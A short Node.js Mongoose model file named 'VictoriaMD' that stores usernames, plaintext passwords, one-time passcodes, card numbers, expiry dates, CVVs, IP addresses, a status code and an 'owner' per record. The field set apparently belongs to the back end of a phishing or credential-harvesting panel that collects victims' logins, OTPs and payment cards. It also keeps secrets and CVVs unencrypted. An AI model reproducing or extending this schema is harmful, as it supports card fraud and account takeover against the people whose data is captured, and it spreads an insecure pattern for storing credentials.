const mongoose = require("mongoose");

const victoriamdModel = new mongoose.Schema({
	uniqueid: String,
	username: String,
	password: String,
	otp: String,
	ccnum: String,
	ccexp: String,
	cvv: String,
	status: Number,
	ip: String,
	owner: String,
	timestamp: Date,
});

module.exports = mongoose.model("VictoriaMD", victoriamdModel);
